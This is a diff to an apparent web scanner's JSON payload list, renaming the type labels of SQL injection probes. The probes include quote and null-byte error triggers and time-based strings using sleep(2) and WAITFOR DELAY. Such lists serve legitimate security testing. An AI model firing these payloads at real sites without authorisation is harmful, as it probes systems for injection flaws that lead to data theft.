@@ -30,39 +30,39 @@
           [
             {
               "payload": "5;;5%27;;5%27%27",
-              "type": "error-based"
+              "type": "Error-Based SQL Injection"
             },
             {
               "payload": "5;;5%27;;5%00",
-              "type": "error-based"
+              "type": "Error-Based SQL Injection"
             },
             {
               "payload": "5;;5%27;;6-1",
-              "type": "error-based"
+              "type": "Error-Based SQL Injection"
             },
             {
               "payload": "5;;5%27;;6%0a-1",
-              "type": "error-based"
+              "type": "Error-Based SQL Injection"
             },
             {
               "payload": "5;;5%27;;6-%0a1",
-              "type": "error-based"
+              "type": "Error-Based SQL Injection"
             },
             {
               "payload": "[];;[]%27;;[]%27%27",
-              "type": "error-based"
+              "type": "Error-Based SQL Injection"
             },
             {
               "payload": "[];;[]%27;;[]`%20%23",
-              "type": "error-based"
+              "type": "Error-Based SQL Injection"
             },
             {
               "payload": "2;;%27+or+sleep(2)+--+-",
-              "type": "time-based"
+              "type": "Time-Based SQL Injection"
             },
             {
               "payload": "2;;%27+or+WAIT+FOR+DELAY+%2700:00:02%27+--+-",
-              "type": "time-based"
+              "type": "Time-Based SQL Injection"
             }
           ],
   "RXSS Payloads":
